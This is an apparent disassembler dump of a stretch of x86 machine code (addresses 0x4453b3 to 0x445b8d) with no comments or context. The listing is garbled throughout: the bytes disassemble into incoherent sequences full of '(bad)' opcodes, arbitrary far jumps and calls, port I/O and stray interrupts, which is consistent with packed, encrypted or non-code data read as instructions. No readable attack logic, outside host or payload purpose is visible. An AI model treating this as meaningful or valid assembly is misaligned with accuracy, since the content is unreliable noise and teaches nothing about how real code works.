  4453b3:	dec    edx
  4453b4:	jmp    0x44537a
  4453b6:	imul   esp,DWORD PTR [ecx],0xffffffc0
  4453b9:	xchg   esp,eax
  4453ba:	dec    esp
  4453bb:	push   ecx
  4453bc:	mov    esi,0x4c97dc1c
  4453c1:	adc    eax,0xe8fea019
  4453c6:	hlt    
  4453c7:	call   0x4e85:0x86bdf942
  4453ce:	arpl   WORD PTR [esi+0x3],sp
  4453d1:	mov    ah,0xa7
  4453d3:	(bad)  
  4453d4:	mov    dl,0xa8
  4453d6:	cwde   
  4453d7:	inc    ecx
  4453d8:	xchg   ebp,eax
  4453d9:	pop    ecx
  4453da:	gs dec ebx
  4453dc:	or     ebx,ebp
  4453de:	mov    eax,ds:0xacac7ea2
  4453e3:	mov    ah,0x64
  4453e5:	stos   DWORD PTR es:[edi],eax
  4453e6:	ds add al,0x1d
  4453e9:	loop   0x445374
  4453eb:	ffree  st(7)
  4453ed:	pop    ds
  4453ee:	push   ebp
  4453ef:	mov    WORD PTR [edi],ss
  4453f1:	arpl   sp,bx
  4453f3:	fcomp  QWORD PTR ds:0x3fa8ae19
  4453f9:	xchg   esp,eax
  4453fa:	pop    es
  4453fb:	mov    ebp,0xa3dc214c
  445400:	arpl   WORD PTR [edx+0x33],si
  445403:	out    dx,al
  445404:	lea    edi,[ebp-0x39]
  445407:	cli    
  445408:	mov    cl,0xfa
  44540a:	aad    0x4f
  44540c:	clc    
  44540d:	mov    dl,0xab
  44540f:	xchg   esp,eax
  445410:	imul   ebx,DWORD PTR [edx+0x32],0x72da3739
  445417:	jnp    0x44547a
  445419:	popf   
  44541a:	push   edx
  44541b:	jle    0x4453f9
  44541d:	cmc    
  44541e:	mov    ds:0x2eed5899,al
  445423:	sub    eax,0xe76f4a1b
  445428:	(bad)  
  445429:	xor    ch,BYTE PTR [esi-0x4]
  44542c:	mov    cl,0x28
  44542e:	add    DWORD PTR [edx+0x59939294],esp
  445434:	sar    DWORD PTR [ecx-0x6e],cl
  445437:	shr    al,1
  445439:	(bad)  
  44543a:	inc    edi
  44543b:	sub    eax,0x4d4d1206
  445440:	stos   BYTE PTR es:[edi],al
  445441:	or     al,0x33
  445443:	pop    eax
  445444:	xor    al,0xf9
  445446:	das    
  445447:	xor    al,0xeb
  445449:	loopne 0x44540b
  44544b:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  44544d:	cs push ss
  44544f:	pop    ebp
  445450:	out    dx,al
  445451:	adc    al,0x9e
  445453:	in     al,dx
  445454:	mov    ebp,0x154c5713
  445459:	pop    ebx
  44545a:	test   DWORD PTR [esi-0x59],0xf5e907ee
  445461:	adc    bl,0x8b
  445464:	mov    ebp,DWORD PTR [edi+eiz*2]
  445467:	ss xchg esi,eax
  445469:	add    DWORD PTR [ebp+0x79],edi
  44546c:	shl    BYTE PTR ds:0xdee2c7e,cl
  445472:	adc    eax,0xdb3bedde
  445477:	lock sti 
  445479:	je     0x44542b
  44547b:	or     eax,edi
  44547d:	add    BYTE PTR [ecx],0x9f
  445480:	adc    al,0xae
  445483:	das    
  445484:	push   edi
  445485:	adc    DWORD PTR es:[eax+0x7e8b52d3],edx
  44548c:	jae    0x44540f
  44548e:	sbb    dl,bh
  445490:	pop    edx
  445491:	fwait
  445492:	imul   BYTE PTR [ebx+0x7b]
  445495:	sub    DWORD PTR [esi],ebx
  445497:	pop    ebp
  445498:	pop    edx
  445499:	(bad)  
  44549a:	out    0xc2,al
  44549c:	xor    ah,bh
  44549e:	jp     0x445513
  4454a0:	push   ebx
  4454a1:	add    edx,DWORD PTR [esi+edi*4]
  4454a4:	arpl   WORD PTR [edi],ax
  4454a6:	or     al,BYTE PTR [esi+0x361963f5]
  4454ac:	jne    0x4454fe
  4454ae:	push   edi
  4454af:	jmp    FWORD PTR [ebx-0x44c02a60]
  4454b5:	xor    cl,BYTE PTR [ebx-0x30]
  4454b8:	in     al,dx
  4454b9:	dec    ebp
  4454ba:	and    esi,esp
  4454bc:	call   0x7543233a
  4454c1:	mov    eax,0xcd8e53a2
  4454c6:	aad    0xc8
  4454c8:	outs   dx,DWORD PTR ds:[esi]
  4454c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4454ca:	aaa    
  4454cb:	sub    bl,BYTE PTR [esi]
  4454cd:	push   edi
  4454ce:	jnp    0x4454d3
  4454d0:	cld    
  4454d1:	sar    DWORD PTR ds:0x18e9f818,1
  4454d7:	pop    eax
  4454d8:	mov    ds:0x923fa9b6,al
  4454dd:	mov    esp,0x16c2d364
  4454e2:	sahf   
  4454e3:	add    DWORD PTR [ecx],esp
  4454e5:	sub    DWORD PTR [esi],ebx
  4454e7:	mov    ds:0xc04483e0,al
  4454ec:	std    
  4454ed:	ins    DWORD PTR es:[edi],dx
  4454ee:	jmp    0x30e41e3c
  4454f3:	addr16 gs (bad) 
  4454f6:	xor    BYTE PTR [ebx-0x3],bh
  4454f9:	add    esp,DWORD PTR [edi]
  4454fb:	mov    eax,ds:0x2987b2d8
  445500:	push   0xffffff94
  445502:	jb     0x44550d
  445504:	out    0x80,eax
  445506:	(bad)  
  445507:	push   eax
  445508:	aas    
  445509:	ins    BYTE PTR es:[edi],dx
  44550a:	mov    ah,BYTE PTR [edx-0x48]
  44550d:	not    DWORD PTR [esp+ecx*2-0x2144fde8]
  445514:	xchg   edx,eax
  445515:	aaa    
  445516:	out    dx,al
  445517:	xchg   ch,al
  445519:	jnp    0x44552c
  44551b:	call   0x1ada4cb5
  445520:	loope  0x445537
  445522:	stc    
  445523:	(bad)  [ecx+0x45]
  445526:	jb     0x445540
  445528:	or     DWORD PTR [ecx-0x402b6656],ecx
  44552e:	lods   al,BYTE PTR ds:[esi]
  44552f:	and    ah,ch
  445531:	jo     0x445546
  445533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445534:	push   esp
  445535:	ins    DWORD PTR es:[edi],dx
  445536:	or     esp,edi
  445538:	inc    esp
  445539:	sbb    bh,BYTE PTR [eax-0x21dcd7a6]
  44553f:	ja     0x4454cf
  445541:	outs   dx,DWORD PTR ds:[esi]
  445542:	into   
  445543:	aas    
  445544:	(bad)  
  445546:	push   ebx
  445547:	push   esp
  445548:	in     al,0xb4
  44554a:	fwait
  44554b:	sub    DWORD PTR [esi+0xb3b5924],eax
  445551:	fsubr  DWORD PTR fs:[ebx-0x7749a215]
  445558:	mov    dh,0x98
  44555a:	lock aaa 
  44555c:	and    al,0x87
  44555e:	fdiv   DWORD PTR [edx]
  445560:	push   ebx
  445561:	clc    
  445562:	pop    ds
  445563:	not    DWORD PTR [ebx-0x797f10e]
  445569:	enter  0x39d7,0x2
  44556d:	xor    ebp,DWORD PTR [ecx]
  44556f:	mov    ebp,ebx
  445571:	mov    edi,0x16dd2374
  445576:	cmp    DWORD PTR [edi+ebp*8],ecx
  445579:	sbb    cl,ah
  44557b:	lods   al,BYTE PTR ds:[esi]
  44557c:	inc    esp
  44557d:	gs scas al,BYTE PTR es:[edi]
  44557f:	cmp    al,0xa3
  445581:	mov    dh,ch
  445583:	adc    ch,BYTE PTR [edi+0x7f256a1d]
  445589:	lock cs pop ds
  44558c:	inc    ecx
  44558d:	dec    ebx
  44558e:	add    eax,0x3e16053e
  445593:	retf   
  445594:	lods   eax,DWORD PTR ds:[esi]
  445595:	xchg   edi,eax
  445596:	dec    ebp
  445597:	mov    edx,0x55508938
  44559c:	dec    eax
  44559d:	jmp    0x95fe7c06
  4455a2:	sahf   
  4455a3:	push   ebp
  4455a4:	mov    edi,0x8e09314a
  4455a9:	ficom  WORD PTR [edi-0x3764592c]
  4455af:	cdq    
  4455b0:	repz sub dl,bl
  4455b3:	mov    al,ds:0xbeb6d145
  4455b8:	fcmovbe st,st(0)
  4455ba:	mov    dl,0x58
  4455bc:	(bad)  [ebp+ebx*8-0x5e1b1c0d]
  4455c3:	dec    edi
  4455c4:	mov    WORD PTR [edi+0x332881b0],ds
  4455ca:	and    al,0x70
  4455cc:	rcl    eax,1
  4455ce:	iret   
  4455cf:	mov    bh,0xb
  4455d1:	mov    edx,0x726a765
  4455d6:	pop    es
  4455d7:	imul   ebp,DWORD PTR [edi],0x2
  4455da:	int    0x98
  4455dc:	std    
  4455dd:	fsubr  QWORD PTR [ecx-0x75]
  4455e0:	sub    eax,0x43b93435
  4455e5:	dec    edx
  4455e6:	shl    BYTE PTR [esi+0x4b],0x64
  4455ea:	sbb    ecx,DWORD PTR [ebx]
  4455ec:	jecxz  0x4455cd
  4455ee:	(bad)  
  4455ef:	cli    
  4455f0:	je     0x445658
  4455f2:	inc    ebp
  4455f3:	call   0x37e7:0xb5e301b2
  4455fa:	push   ebp
  4455fb:	xor    eax,0xc43021cc
  445600:	test   ah,bh
  445602:	pop    ss
  445603:	dec    ecx
  445604:	out    0x74,al
  445606:	sbb    al,0x60
  445608:	outs   dx,BYTE PTR ds:[esi]
  445609:	loopne 0x4455a1
  44560b:	inc    edi
  44560c:	xchg   esp,eax
  44560d:	push   esp
  44560e:	into   
  44560f:	pop    edx
  445610:	adc    eax,0x42ab910b
  445615:	mov    DWORD PTR [ebx-0x3dcaa7f9],edi
  44561b:	unpckhps xmm6,xmm4
  44561e:	outs   dx,DWORD PTR ds:[esi]
  44561f:	and    al,0x51
  445621:	hlt    
  445622:	xchg   ecx,eax
  445623:	mov    ecx,0x26a15adb
  445628:	imul   edi,DWORD PTR [edi+0xf87fde2],0x2c
  44562f:	pop    ecx
  445630:	rcr    DWORD PTR [eax+0x171f4d38],1
  445636:	aas    
  445637:	sbb    BYTE PTR [edx-0x4e871cee],dh
  44563d:	shl    BYTE PTR [edi+0x52],cl
  445640:	inc    edi
  445641:	adc    DWORD PTR [edi],ebp
  445643:	sbb    ebp,DWORD PTR [edi+0x32931da0]
  445649:	in     eax,dx
  44564a:	xor    DWORD PTR [ebx],esi
  44564c:	cwde   
  44564d:	lea    ecx,ds:0xd7edfb85
  445653:	and    eax,0xb95ef42
  445658:	std    
  445659:	in     eax,0x3
  44565b:	xchg   ecx,eax
  44565c:	call   0x5a9bf130
  445661:	pop    ecx
  445662:	div    bh
  445664:	in     al,0xa7
  445666:	mov    edx,0xaf042d6e
  44566b:	cmp    bl,BYTE PTR [esi-0x55d0f4f8]
  445671:	mov    edx,0xaa97e563
  445676:	sbb    ah,al
  445678:	sub    al,0xb5
  44567a:	out    0xf7,al
  44567c:	push   0xea29c51b
  445681:	mov    al,0x54
  445683:	jecxz  0x445633
  445685:	in     al,0x81
  445687:	add    al,BYTE PTR [ebx-0x620f38be]
  44568d:	das    
  44568e:	js     0x445678
  445690:	mov    dl,al
  445692:	outs   dx,DWORD PTR ds:[esi]
  445693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445694:	mov    edx,0x51a3a8de
  445699:	scas   al,BYTE PTR es:[edi]
  44569a:	mov    cl,0xf3
  44569c:	inc    esi
  44569d:	lods   al,BYTE PTR ds:[esi]
  44569e:	mov    ebp,0x7ff06ac2
  4456a3:	(bad)  
  4456a4:	fwait
  4456a5:	test   al,0x12
  4456a7:	sub    DWORD PTR cs:[ebx+0x6c],ebx
  4456ab:	mov    eax,ds:0xe12d5a3c
  4456b0:	in     al,dx
  4456b1:	out    0x53,eax
  4456b3:	inc    esi
  4456b4:	(bad)  
  4456b5:	fistp  DWORD PTR [ecx-0x2ad85b80]
  4456bb:	mov    cl,0x8f
  4456bd:	sbb    cl,bl
  4456bf:	cmp    eax,ecx
  4456c1:	xor    al,0xdd
  4456c3:	sub    ch,BYTE PTR [ebp-0x6c]
  4456c6:	jg     0x4456c9
  4456c8:	fimul  WORD PTR [ecx+0x69]
  4456cb:	push   ebx
  4456cc:	adc    al,0x5b
  4456ce:	sbb    eax,0xdf76ad20
  4456d3:	cld    
  4456d4:	pusha  
  4456d5:	xchg   ebp,eax
  4456d6:	imul   ecx,DWORD PTR [ebp-0x22dcfc1d],0x5b
  4456dd:	inc    esp
  4456de:	enter  0xfb89,0x18
  4456e2:	sub    BYTE PTR [edx+0xc],ah
  4456e5:	sbb    eax,0xb71815b0
  4456ea:	retf   0xf830
  4456ed:	dec    ecx
  4456ee:	js     0x445683
  4456f0:	retf   
  4456f1:	add    eax,0x2d7b161b
  4456f6:	jmp    0x937420a0
  4456fb:	mov    dl,0x87
  4456fd:	mov    eax,0x9a78a60c
  445702:	mov    bh,0xfb
  445704:	xchg   edx,eax
  445705:	cmp    dl,BYTE PTR [edx+0x7ad14ee9]
  44570b:	xor    edi,edx
  44570d:	loopne 0x445782
  44570f:	mov    bl,0x99
  445711:	repnz xchg esi,eax
  445713:	retf   0xec84
  445716:	sbb    BYTE PTR [ebx+ebp*1+0x48],ch
  44571a:	sar    BYTE PTR ds:0xf501a3e6,1
  445720:	or     BYTE PTR [ecx+0x729bccb3],ah
  445726:	xor    cl,BYTE PTR [eax]
  445728:	fsub   QWORD PTR [esi+0x44]
  44572b:	push   edx
  44572c:	(bad)  
  44572d:	enter  0xd6f2,0x38
  445731:	inc    ebp
  445732:	jbe    0x4456dc
  445734:	mov    ds:0xa8f668a4,eax
  445739:	add    ebp,eax
  44573b:	dec    edx
  44573c:	sub    al,0x77
  44573e:	ss and eax,0x8546ff6e
  445744:	mov    ebp,0x106ffeb4
  445749:	fnsave [eax+ebp*8]
  44574c:	dec    esi
  44574d:	mov    WORD PTR [ebp+0x251e886d],gs
  445753:	mov    al,0x80
  445755:	inc    eax
  445756:	(bad)  
  445757:	retf   0x7d18
  44575a:	jno    0x4457ac
  44575c:	iret   
  44575d:	pop    ebx
  44575e:	sbb    dh,0xaa
  445761:	push   ds
  445762:	push   esi
  445763:	sar    BYTE PTR [esi+eiz*2+0x6d],cl
  445767:	ja     0x4457ba
  445769:	jno    0x445707
  44576b:	mov    esi,0x1a6540ce
  445770:	sbb    esp,DWORD PTR [ebx+0x24ee6940]
  445776:	mov    ds:0x5399de2f,eax
  44577b:	xor    al,0x89
  44577d:	inc    esi
  44577e:	xchg   ecx,eax
  44577f:	sub    eax,0xc0db4309
  445784:	rcl    cl,1
  445786:	ja     0x4457bf
  445788:	mov    dl,0xae
  44578a:	mov    fs,WORD PTR [edx-0x79782b8c]
  445790:	ret    0x852b
  445793:	push   edi
  445794:	mov    ds:0xcae44af2,al
  445799:	sub    edi,0xffffff80
  44579c:	pusha  
  44579d:	fiadd  DWORD PTR [eax+eax*1]
  4457a0:	mov    dh,0x59
  4457a2:	out    dx,eax
  4457a3:	fwait
  4457a4:	shl    BYTE PTR [edx+0x20],cl
  4457a7:	test   BYTE PTR [ecx+eiz*8],ah
  4457aa:	inc    eax
  4457ab:	xor    DWORD PTR [esi-0x4c],ecx
  4457ae:	xchg   esi,eax
  4457af:	maxps  xmm6,XMMWORD PTR [ebx+0x6b2123da]
  4457b6:	aam    0xa4
  4457b8:	stos   BYTE PTR es:[edi],al
  4457b9:	fistp  WORD PTR [edx-0x6d]
  4457bc:	pop    ecx
  4457bd:	cmc    
  4457be:	xor    BYTE PTR [eax+eiz*1-0x1180323a],dl
  4457c5:	adc    al,0x89
  4457c7:	pop    ecx
  4457c8:	jne    0x445803
  4457ca:	mov    bh,0xf0
  4457cc:	dec    esp
  4457cd:	xor    DWORD PTR [ecx+0x34],ecx
  4457d0:	push   ebp
  4457d1:	pusha  
  4457d2:	(bad)  
  4457d3:	dec    edi
  4457d4:	scas   eax,DWORD PTR es:[edi]
  4457d5:	pop    eax
  4457d6:	cld    
  4457d7:	push   ss
  4457d8:	int    0xaf
  4457da:	add    eax,0x6f4829ce
  4457df:	inc    ebx
  4457e0:	outs   dx,DWORD PTR ds:[esi]
  4457e1:	daa    
  4457e2:	clc    
  4457e3:	pop    ds
  4457e4:	fnstsw WORD PTR [esi-0x70]
  4457e7:	and    eax,0xa5c73b24
  4457ec:	ss jmp 0x8099:0x8f2e121d
  4457f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4457f5:	div    BYTE PTR [edi+0x38466a3b]
  4457fb:	outs   dx,BYTE PTR ds:[esi]
  4457fc:	and    eax,0x3f46f2f4
  445801:	xchg   esi,eax
  445802:	mov    ecx,0x8642dac0
  445807:	jbe    0x445818
  445809:	pop    ds
  44580a:	rcl    ah,0xf
  44580d:	leave  
  44580e:	imul   esp,DWORD PTR [ecx],0x21
  445811:	js     0x4457bc
  445813:	jg     0x445840
  445815:	pop    ebx
  445816:	cs lahf 
  445818:	mov    ?,WORD PTR ds:0x4502b923
  44581e:	add    eax,0xd543fd05
  445823:	fbstp  TBYTE PTR [ebp-0x18882d44]
  445829:	shl    BYTE PTR [esi],0x4c
  44582c:	xchg   edx,eax
  44582d:	sar    BYTE PTR [edx],cl
  44582f:	xchg   BYTE PTR [ebx-0xa],bl
  445832:	pop    esp
  445833:	mov    esi,0xac1bb948
  445838:	sahf   
  445839:	cmp    bl,al
  44583b:	rcr    DWORD PTR [edi],0x69
  44583e:	xchg   ecx,eax
  44583f:	out    0xa3,al
  445841:	add    esi,esi
  445843:	fstp   DWORD PTR [ecx-0x71061aa2]
  445849:	pop    ebp
  44584a:	xlat   BYTE PTR ds:[ebx]
  44584b:	ret    
  44584c:	addr16 cs pop edx
  44584f:	adc    BYTE PTR [ecx],bh
  445851:	jbe    0x4457dd
  445853:	sbb    esp,DWORD PTR [edi+0x5ffd1761]
  445859:	mov    cl,0xd
  44585b:	dec    BYTE PTR [ebp+0x33661356]
  445861:	or     esi,DWORD PTR [ebx+0x56bdbcea]
  445867:	and    al,dl
  445869:	repnz ins DWORD PTR es:[edi],dx
  44586b:	mov    esi,0xabd2828e
  445870:	push   es
  445871:	push   eax
  445872:	call   0x8bb:0x39343874
  445879:	mov    al,ds:0xd135a579
  44587e:	or     ecx,ecx
  445880:	push   es
  445881:	xchg   ecx,eax
  445882:	xor    ah,BYTE PTR [edx+0x53]
  445885:	sbb    DWORD PTR [edi+0x77],eax
  445888:	imul   edi,DWORD PTR [ebx],0x2c3f83af
  44588e:	(bad)  
  44588f:	xchg   edx,eax
  445890:	xchg   ecx,eax
  445891:	jmp    0x1a14b1e6
  445896:	mov    eax,0xbc527d6e
  44589b:	jns    0x4458a1
  44589d:	pusha  
  44589e:	ret    0x6102
  4458a1:	inc    eax
  4458a2:	xchg   ebp,eax
  4458a3:	iret   
  4458a4:	or     eax,0xa16d9fdd
  4458a9:	mov    eax,0xf91d6a1f
  4458ae:	aad    0x20
  4458b0:	(bad)  
  4458b1:	cld    
  4458b2:	push   esp
  4458b3:	or     ebp,ecx
  4458b5:	mov    esi,0x5011bfbd
  4458ba:	adc    eax,0x85de73ae
  4458bf:	into   
  4458c0:	daa    
  4458c1:	adc    DWORD PTR [ebp*1+0x1432f08b],ecx
  4458c8:	mov    fs,WORD PTR [edi]
  4458ca:	pop    ebp
  4458cb:	out    0xda,al
  4458cd:	out    0xae,eax
  4458cf:	int    0x22
  4458d1:	out    dx,al
  4458d2:	push   ds
  4458d3:	loopne 0x44587d
  4458d5:	scas   eax,DWORD PTR es:[edi]
  4458d6:	shl    BYTE PTR es:[edi],0x7a
  4458da:	loop   0x4458c3
  4458dc:	xor    DWORD PTR [edi],esi
  4458de:	xchg   ebx,eax
  4458df:	sub    esi,eax
  4458e1:	mov    ah,0x18
  4458e3:	add    bh,BYTE PTR [ebx+edx*1-0x1e]
  4458e7:	push   esi
  4458e8:	sub    eax,0xd51afefa
  4458ed:	jnp    0x4458d2
  4458ef:	je     0x4458b9
  4458f1:	test   BYTE PTR [edi],0xb3
  4458f4:	loope  0x4458e9
  4458f6:	enter  0x5347,0x47
  4458fa:	push   ebx
  4458fb:	(bad)  
  4458fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4458fd:	loopne 0x445977
  4458ff:	xchg   ebx,eax
  445900:	push   edx
  445901:	sub    DWORD PTR [ebx],ecx
  445903:	cli    
  445904:	gs add dh,bl
  445907:	pop    esi
  445908:	xor    al,0x51
  44590a:	ret    0x61de
  44590d:	jne    0x4458d0
  44590f:	int    0x55
  445911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445912:	lock pop eax
  445914:	adc    DWORD PTR [ecx-0x26],edi
  445917:	mov    es,WORD PTR [ebx+0x26]
  44591a:	mov    eax,0x50612dcd
  44591f:	fild   DWORD PTR [esi]
  445921:	adc    ch,BYTE PTR [edi-0x27125e10]
  445927:	(bad)  ds:0x640c3907
  44592d:	pop    edi
  44592e:	push   ebp
  44592f:	xor    BYTE PTR [edx+0x19],0xbd
  445933:	outs   dx,BYTE PTR ds:[esi]
  445934:	xchg   DWORD PTR ds:0x7b686b22,edx
  44593a:	sahf   
  44593b:	and    bh,BYTE PTR [edi]
  44593d:	outs   dx,BYTE PTR ds:[esi]
  44593e:	jnp    0x4459a6
  445940:	call   0x34c3:0x79f311ad
  445947:	or     al,0x1f
  445949:	pop    eax
  44594a:	aam    0x4e
  44594c:	jae    0x44593d
  44594e:	(bad)  
  44594f:	test   al,0x32
  445951:	and    edi,DWORD PTR [edi]
  445953:	std    
  445954:	jmp    0x4458fc
  445956:	inc    ebx
  445957:	jmp    0x445906
  445959:	aad    0x20
  44595b:	scas   eax,DWORD PTR es:[edi]
  44595c:	xor    al,0x9
  44595e:	mov    ?,WORD PTR [ebx]
  445960:	and    ecx,DWORD PTR [esp+eax*4]
  445963:	cs popf 
  445965:	and    al,0xa7
  445967:	fisttp QWORD PTR [edi-0x3e74fc7c]
  44596d:	sahf   
  44596e:	popf   
  44596f:	or     edx,DWORD PTR ds:0xad0a1a1c
  445975:	pop    es
  445976:	lahf   
  445977:	cs push ss
  445979:	stos   BYTE PTR es:[edi],al
  44597a:	push   ss
  44597b:	xor    DWORD PTR [edx],0xffffffb6
  44597e:	push   0xfffffff2
  445980:	xor    BYTE PTR [ecx],dl
  445982:	sub    al,0x52
  445984:	ds in  al,0x2f
  445987:	ret    0xc1af
  44598a:	push   ebp
  44598b:	jno    0x4459aa
  44598d:	ins    DWORD PTR es:[edi],dx
  44598e:	or     ebp,edi
  445990:	mov    dl,0xa5
  445992:	add    DWORD PTR [eax+0x43],0xffffffc9
  445996:	mov    WORD PTR [edx],ds
  445998:	das    
  445999:	cli    
  44599a:	and    eax,0xfc6c6953
  44599f:	call   0xc58b77d5
  4459a4:	aam    0xad
  4459a6:	xchg   ebx,eax
  4459a7:	out    0xa6,al
  4459a9:	sub    eax,0xd666b47e
  4459ae:	mov    ds:0xe8209467,eax
  4459b3:	pop    esi
  4459b4:	jmp    0x9f4b:0x988b6f8b
  4459bb:	nop
  4459bc:	(bad)  
  4459bd:	dec    esp
  4459be:	cmp    eax,ebp
  4459c0:	mov    edi,DWORD PTR [ebx]
  4459c2:	faddp  st(6),st
  4459c4:	mov    al,ds:0x64e2df1e
  4459c9:	scas   eax,DWORD PTR es:[edi]
  4459ca:	loopne 0x4459a8
  4459cc:	aaa    
  4459cd:	fsubp  st(4),st
  4459cf:	mov    al,0x3a
  4459d1:	aam    0x67
  4459d3:	pop    edi
  4459d4:	cmp    DWORD PTR [edx],0x39d057fe
  4459da:	xchg   edi,eax
  4459db:	mov    WORD PTR [ecx+edx*1-0x669f6fca],?
  4459e2:	stos   BYTE PTR es:[edi],al
  4459e3:	sub    al,0x86
  4459e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4459e6:	mov    bh,BYTE PTR [esi-0x7465bc0]
  4459ec:	push   ss
  4459ed:	or     al,0x9c
  4459ef:	(bad)  
  4459f0:	(bad)  
  4459f1:	aam    0x19
  4459f3:	push   es
  4459f4:	push   cs
  4459f5:	push   cs
  4459f6:	test   al,0x5d
  4459f8:	neg    dl
  4459fa:	cmp    eax,0xc61bdc38
  4459ff:	mov    es,WORD PTR [esi]
  445a01:	pop    ss
  445a02:	and    ah,0x52
  445a05:	cmp    bh,BYTE PTR [ecx-0x49767505]
  445a0b:	stos   BYTE PTR es:[edi],al
  445a0c:	sub    BYTE PTR [ebp+0x6dd4e2f],ah
  445a12:	shl    BYTE PTR [esi-0x3c],0x6e
  445a16:	mov    edi,0x9485905d
  445a1b:	mov    eax,0xfe9341f8
  445a20:	or     al,0xc2
  445a22:	xor    DWORD PTR [edi+0x13],esi
  445a25:	inc    esi
  445a26:	hlt    
  445a27:	jnp    0x445a08
  445a29:	sub    BYTE PTR [ebx+0x2f],cl
  445a2c:	stc    
  445a2d:	ins    BYTE PTR es:[edi],dx
  445a2e:	mov    ebp,0x2423491b
  445a33:	inc    ebp
  445a34:	add    bh,BYTE PTR [edx+0x749873b0]
  445a3a:	cdq    
  445a3b:	(bad)  
  445a3c:	imul   esi,DWORD PTR [ecx+edi*4+0x30],0x31c26ec2
  445a44:	sti    
  445a45:	int3   
  445a46:	fmul   DWORD PTR [eax+0x35]
  445a49:	pop    es
  445a4a:	push   0x6b
  445a4c:	in     al,0x65
  445a4e:	call   0x7a98:0x16877ca4
  445a55:	pop    ebx
  445a56:	test   eax,0x6cca9551
  445a5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445a5c:	cmp    edi,DWORD PTR [ebp-0x1e97b223]
  445a62:	test   DWORD PTR [ebx],esp
  445a64:	sbb    cl,BYTE PTR [ebx]
  445a66:	xor    ebx,edx
  445a68:	cs mov esi,0xbd6ba02e
  445a6e:	or     bl,BYTE PTR ds:0x7c475895
  445a74:	scas   eax,DWORD PTR es:[edi]
  445a75:	inc    ecx
  445a76:	sub    ebx,edi
  445a78:	dec    ebx
  445a79:	xchg   ebx,eax
  445a7a:	jecxz  0x445a28
  445a7c:	dec    edi
  445a7d:	jg     0x445aa6
  445a7f:	test   eax,0x56cfc84e
  445a84:	xchg   edx,eax
  445a85:	aad    0xad
  445a87:	imul   edx,eax,0x534c6d4c
  445a8d:	in     al,dx
  445a8e:	inc    eax
  445a8f:	into   
  445a90:	lea    ebp,ds:0x565d84d6
  445a96:	fdiv   QWORD PTR [eax-0x5]
  445a99:	cli    
  445a9a:	xchg   esp,eax
  445a9b:	inc    ecx
  445a9c:	or     bl,BYTE PTR [ebp+ebp*8-0x3]
  445aa0:	or     BYTE PTR [edx-0x4e5714d7],0xd9
  445aa7:	mov    ch,0x7c
  445aa9:	add    eax,0xcfd119ad
  445aae:	lods   eax,DWORD PTR ds:[esi]
  445aaf:	xchg   esp,eax
  445ab0:	xchg   DWORD PTR [edi+0x30],edi
  445ab3:	jmp    0x445a3a
  445ab5:	mov    esp,0xa8a2ddd8
  445aba:	retf   
  445abb:	push   0x74c874e2
  445ac0:	add    dl,ah
  445ac2:	push   ecx
  445ac3:	ret    
  445ac4:	ror    DWORD PTR [edx],cl
  445ac6:	pop    ebp
  445ac7:	fstp   QWORD PTR [eax]
  445ac9:	jno    0x445b1c
  445acb:	jl     0x445ab3
  445acd:	mov    ecx,0x5a91b2ad
  445ad2:	fs into 
  445ad4:	loopne 0x445a65
  445ad6:	inc    edx
  445ad7:	outs   dx,DWORD PTR ds:[esi]
  445ad8:	ins    DWORD PTR es:[edi],dx
  445ad9:	push   0x28
  445adb:	or     BYTE PTR [edx+0x655c92b7],bl
  445ae1:	mov    al,ds:0x15848d8f
  445ae6:	loope  0x445b43
  445ae8:	inc    edi
  445ae9:	adc    eax,0x99c839e0
  445aee:	fwait
  445aef:	pop    esi
  445af0:	cmp    esp,DWORD PTR [ecx-0x66]
  445af3:	or     DWORD PTR [edi],0xffffffd2
  445af6:	inc    ecx
  445af7:	test   al,0x6b
  445af9:	mov    ds:0x2ad7116,eax
  445afe:	(bad)  
  445aff:	push   ebp
  445b00:	jae    0x445b07
  445b02:	adc    BYTE PTR [esi-0x63331b5a],dl
  445b08:	iret   
  445b09:	push   ebp
  445b0a:	jl     0x445b10
  445b0c:	aam    0xab
  445b0e:	std    
  445b0f:	dec    eax
  445b10:	fmul   QWORD PTR gs:[esp+ecx*1-0x59]
  445b15:	in     eax,0x26
  445b17:	pop    ebp
  445b18:	sahf   
  445b19:	call   0x592f0dcd
  445b1e:	or     esi,DWORD PTR [eax+0x3d]
  445b21:	stos   BYTE PTR es:[edi],al
  445b22:	mov    cl,0xfe
  445b24:	push   eax
  445b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445b26:	loope  0x445b4a
  445b28:	jl     0x445b8f
  445b2a:	mov    edi,DWORD PTR ds:0x6064c276
  445b30:	ror    BYTE PTR [ecx],0xbe
  445b33:	(bad)  
  445b36:	cwde   
  445b37:	cmp    BYTE PTR [ebx],0x8a
  445b3a:	push   esi
  445b3b:	mov    ?,WORD PTR [ecx+0x48]
  445b3e:	xchg   edx,eax
  445b3f:	scas   eax,DWORD PTR es:[edi]
  445b40:	fisub  WORD PTR [esi+0x64453681]
  445b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445b47:	sub    BYTE PTR [edi+esi*2],dh
  445b4a:	adc    DWORD PTR [bp+di-0x877],esi
  445b4f:	out    0x20,eax
  445b51:	sbb    eax,0xb3d5b286
  445b56:	aas    
  445b57:	cmp    esp,DWORD PTR [ebx+0x19]
  445b5a:	out    dx,eax
  445b5b:	icebp  
  445b5c:	inc    edi
  445b5d:	cmp    eax,0x3755a14e
  445b62:	lock fistp WORD PTR [edx]
  445b65:	and    al,0x4
  445b67:	sbb    eax,0x43f2dd88
  445b6c:	int    0xce
  445b6e:	repz iret 
  445b70:	inc    esi
  445b71:	cs jecxz 0x445b4c
  445b74:	pushf  
  445b75:	retf   0xbd4b
  445b78:	push   0x3309689c
  445b7d:	xchg   edx,eax
  445b7e:	jecxz  0x445b52
  445b80:	pop    esp
  445b81:	xchg   edx,eax
  445b82:	jns    0x445b84
  445b84:	xchg   ah,ch
  445b86:	(bad)  
  445b87:	fwait
  445b88:	pop    ebx
  445b89:	mov    dh,0x53
  445b8b:	and    ecx,edi
  445b8d:	retf   
